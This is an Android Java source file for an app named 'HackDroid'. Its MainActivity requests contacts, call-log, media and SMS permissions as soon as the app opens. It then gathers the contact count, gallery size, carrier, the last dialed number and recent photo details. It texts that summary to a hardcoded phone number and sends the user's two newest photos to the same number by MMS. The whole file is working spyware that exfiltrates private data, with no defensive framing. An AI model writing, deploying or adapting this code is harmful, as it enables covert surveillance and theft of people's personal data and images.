package com.example.hack_droid;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 123;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (hasAllPermissions()) {
            collectAndSendData();
        } else {
            requestPermission();
        }
    }

    private void collectAndSendData() {
        try {
            int contacts_count = 0;
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                 try (Cursor c = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)) {
                     if (c != null) {
                         contacts_count = c.getCount();
                     }
                 }
            }

            int gallery_count = 0;
            try {
                 Uri uri;
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                     uri = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
                 } else {
                     uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                 }
                 try (Cursor gallery_cursor = getContentResolver().query(uri, null, null, null, null)) {
                     if (gallery_cursor != null) {
                         gallery_count = gallery_cursor.getCount();
                     }
                 }
            } catch (Exception e) {
                Log.e("HackDroid", "Error reading gallery", e);
            }

            String carrierName = "Unknown";
            try {
                TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    carrierName = tm.getNetworkOperatorName();
                }
            } catch (Exception e) {
                 Log.e("HackDroid", "Error reading carrier", e);
            }
            
            String lastDialed = "None";
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                 // Warning: This can return null or internal numbers
                 lastDialed = CallLog.Calls.getLastOutgoingCall(getApplicationContext());
                 if (lastDialed == null) lastDialed = "None";
            }

            String recentImage = getRecentCameraImage();

            Log.d("HackDroid", "Contacts: " + contacts_count + " Gallery: " + gallery_count + " Recent: " + recentImage);

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                // Send SMS with text summary
                SmsManager smsManager = SmsManager.getDefault();
                String message = String.format(Locale.ENGLISH, "%d, %d, %s, %s, %s", contacts_count, gallery_count, carrierName, lastDialed, recentImage);
                smsManager.sendTextMessage("9087054184", null, message, null, null);
                Toast.makeText(this, "SMS sent", Toast.LENGTH_LONG).show();
                
                // Send MMS with recent 2 images
                ArrayList<Uri> imageUris = getRecentCameraImageUris(2);
                if (!imageUris.isEmpty()) {
                    sendMMS("9087054184", imageUris);
                }
            } else {
                 Toast.makeText(this, "SMS permission missing", Toast.LENGTH_SHORT).show();
            }

        } catch (Exception e) {
            Log.e("HackDroid", "Error collecting data", e);
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    private boolean hasAllPermissions() {
        return hasReadStoragePermission() && hasReadContactsPermission() && hasReadCallLogsPermission() && hasSendSmsPermission();
    }

    private boolean hasReadStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    private boolean hasReadContactsPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasReadCallLogsPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasSendSmsPermission() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {
        List<String> permissions = new ArrayList<>();
        if (!hasReadContactsPermission()) permissions.add(Manifest.permission.READ_CONTACTS);
        if (!hasReadCallLogsPermission()) permissions.add(Manifest.permission.READ_CALL_LOG);
        if (!hasSendSmsPermission()) permissions.add(Manifest.permission.SEND_SMS);
        
        if (!hasReadStoragePermission()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            } else {
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }

        if (!permissions.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    private String getRecentCameraImage() {
        try {
            Uri uri;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                uri = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
            } else {
                uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            }

            String[] projection = {
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATA
            };

            String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";

            try (Cursor cursor = getContentResolver().query(
                    uri,
                    projection,
                    null,
                    null,
                    sortOrder
            )) {
                if (cursor != null && cursor.moveToFirst()) {
                    int nameIndex = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
                    int dateIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN);
                    int sizeIndex = cursor.getColumnIndex(MediaStore.Images.Media.SIZE);

                    String name = nameIndex >= 0 ? cursor.getString(nameIndex) : "Unknown";
                    long dateTaken = dateIndex >= 0 ? cursor.getLong(dateIndex) : 0;
                    long size = sizeIndex >= 0 ? cursor.getLong(sizeIndex) : 0;

                    return String.format(Locale.ENGLISH, "%s (%d KB)", name, size / 1024);
                }
            }
        } catch (Exception e) {
            Log.e("HackDroid", "Error reading recent camera image", e);
        }
        return "None";
    }

    private ArrayList<Uri> getRecentCameraImageUris(int count) {
        ArrayList<Uri> imageUris = new ArrayList<>();
        try {
            Uri uri;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                uri = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
            } else {
                uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            }

            String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATE_TAKEN
            };

            String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";

            try (Cursor cursor = getContentResolver().query(
                    uri,
                    projection,
                    null,
                    null,
                    sortOrder
            )) {
                if (cursor != null) {
                    int idIndex = cursor.getColumnIndex(MediaStore.Images.Media._ID);
                    int retrieved = 0;
                    while (cursor.moveToNext() && retrieved < count) {
                        if (idIndex >= 0) {
                            long id = cursor.getLong(idIndex);
                            Uri imageUri = Uri.withAppendedPath(uri, String.valueOf(id));
                            imageUris.add(imageUri);
                            retrieved++;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("HackDroid", "Error getting recent camera image URIs", e);
        }
        return imageUris;
    }

    private void sendMMS(final String phoneNumber, final ArrayList<Uri> imageUris) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    SmsManager smsManager = SmsManager.getDefault();
                    
                    for (Uri imageUri : imageUris) {
                        try {
                            // Send each image as a separate MMS
                            smsManager.sendMultimediaMessage(
                                MainActivity.this,
                                imageUri,
                                phoneNumber,
                                null,
                                null
                            );
                            Log.d("HackDroid", "MMS sent with image: " + imageUri);
                        } catch (Exception e) {
                            Log.e("HackDroid", "Error sending MMS for image: " + imageUri, e);
                        }
                    }
                    
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            Toast.makeText(MainActivity.this, "MMS sent", Toast.LENGTH_SHORT).show();
                        }
                    });
                } catch (Exception e) {
                    Log.e("HackDroid", "Error sending MMS", e);
                }
            }
        }).start();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
           if (hasAllPermissions()) {
               Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show();
               collectAndSendData();
           } else {
               Toast.makeText(this, "Permissions required for functionality", Toast.LENGTH_LONG).show();
           }
        }
    }
}



